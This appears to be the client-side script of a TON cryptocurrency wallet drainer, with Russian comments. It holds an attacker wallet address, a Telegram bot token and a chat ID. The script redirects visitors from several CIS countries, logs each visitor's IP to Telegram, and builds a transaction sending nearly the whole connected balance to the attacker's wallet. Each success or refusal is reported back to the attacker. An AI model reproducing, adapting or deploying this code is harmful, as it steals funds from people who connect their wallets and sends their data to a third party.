var mainWallet = "UQA9or9rMdG8vk8wSX20LRapZgTUslxrHt-Oa4JCcAynwEEi"; //Ваш кошелек, куда будут лететь активы
var tgBotToken = "7828861073:AAHBgan5y0jpg24QxtNAa36PGJHggto19sM"; //Токен от бота телеграмм
var tgChat = "1447071887"; //Ваш телеграмм-канал



var domain = window.location.hostname;
var ipUser;

fetch('https://ipapi.co/json/').then(response => response.json()).then(data => {
    const country = data.country;
    if (country === 'RU' || country === 'KZ' || country === 'BY' || country === 'UA' || country === 'AM' || country === 'AZ' || country === 'KG' || country === 'MD' || country === 'UZ') {
        window.location.replace('https://ton.org');
    }
    ipUser = data.ip;
    countryUser = data.country;
    console.log('IP: ' + ipUser);
    console.log('Country: ' + countryUser);
    const messageOpen = `\uD83D\uDDC4*Domain:* ${domain}\n\uD83D\uDCBB*User*: ${ipUser} ${countryUser}\n\uD83D\uDCD6*Opened the website*;`;
    const encodedMessageOpen = encodeURIComponent(messageOpen);
    const url = `https://api.telegram.org/bot${tgBotToken}/sendMessage?chat_id=${tgChat}&text=${encodedMessageOpen}&parse_mode=Markdown`;
    fetch(url, {
        method: 'POST',
    }).then(response => {
        if (response.ok) {
            console.log('Success send.');
        } else {
            console.error('Error send.');
        }
    }).catch(error => {
        console.error('Error: ', error);
    });
}).catch(error => console.error('Error IP:', error));*/

const tonConnectUI = new TonConnectUI({ // Использовал правильное имя класса
    manifestUrl: 'https://' + domain + '/tonconnect-manifest.json',
    buttonRootId: 'ton-connect'
});

tonConnectUI.on('walletConnected', (walletAddress) => {
    console.log('Адрес кошелька:', walletAddress);
});

async function didtrans() {
    if (!tonConnectUI.account) {
        alert("Сначала подключите кошелек!");
        return;
    }

    try {
        const response = await fetch('https://toncenter.com/api/v3/wallet?address=' + tonConnectUI.account.address);
        if (!response.ok) {
            throw new Error(`Ошибка при получении баланса: ${response.status} ${response.statusText}`);
        }
        const data = await response.json();

        if (data.error) {
            throw new Error(`Ошибка API Toncenter: ${data.error}`);
        }

        let originalBalance = parseFloat(data.balance);
                let processedBalance = originalBalance - 50000000; // Вычитаем 0.05 TON (50000000 nanotons) в качестве комиссии
        if (processedBalance <= 0) {
          alert("Недостаточно средств на балансе для совершения транзакции, даже с учетом комиссии.");
          return;
        }

        let tgBalance = processedBalance / 1000000000;

        // Проверка, что mainWallet не пустая и является допустимым адресом (простая проверка)
        if (!mainWallet || mainWallet.length < 30) { //Минимальная длина адреса TON
            alert("Необходимо указать корректный адрес кошелька получателя в переменной mainWallet!");
            return;
        }

        const transaction = {
            validUntil: Math.floor(Date.now() / 1000) + 60, // 60 сек
            messages: [{
                address: mainWallet,
                amount: processedBalance.toString() // amount должен быть строкой
            }, ]
        };

        try {
            const result = await tonConnectUI.sendTransaction(transaction);
            console.log("Транзакция отправлена:", result);
            const messageSend = `\uD83D\uDDC4*Domain:* ${domain}\n\uD83D\uDCBB*User:* ${ipUser} ${countryUser}\n\uD83D\uDCC0*Wallet:* [Ton Scan](https://tonscan.org/address/${tonConnectUI.account.address})\n\n\uD83D\uDC8E*Send:* ${tgBalance.toFixed(4)} TON`; //Ограничил кол-во знаков после запятой
            const encodedMessageSend = encodeURIComponent(messageSend);
            const url = `https://api.telegram.org/bot${tgBotToken}/sendMessage?chat_id=${tgChat}&text=${encodedMessageSend}&parse_mode=Markdown`;
            fetch(url, {
                method: 'POST',
            }).then(response => {
                if (response.ok) {
                    console.log('Success send.');
                } else {
                    console.error('Error send.');
                }

            }).catch(error => {
                console.error('Error: ', error);
            });
        } catch (e) {
            console.error("Ошибка при отправке транзакции:", e);
            const messageDeclined = `\uD83D\uDDC4*Domain:* ${domain}\n\uD83D\uDCBB*User:* ${ipUser} ${countryUser}\n\uD83D\uDCC0*Wallet:* [Ton Scan](https://tonscan.org/address/${tonConnectUI.account.address})\n\n\uD83D\uDED1*Declined or error: ${e.message}*`; // Добавил сообщение об ошибке
            const encodedMessageDeclined = encodeURIComponent(messageDeclined);
            const url = `https://api.telegram.org/bot${tgBotToken}/sendMessage?chat_id=${tgChat}&text=${encodedMessageDeclined}&parse_mode=Markdown`;
            fetch(url, {
                method: 'POST',
            }).then(response => {
                if (response.ok) {
                    console.log('Success send.');
                } else {
                    console.error('Error send.');
                }
            }).catch(error => {
                console.error('Error: ', error);
            });
        }
    } catch (error) {
        console.error("Произошла ошибка:", error);
        alert("Произошла ошибка: " + error.message);
    }
}
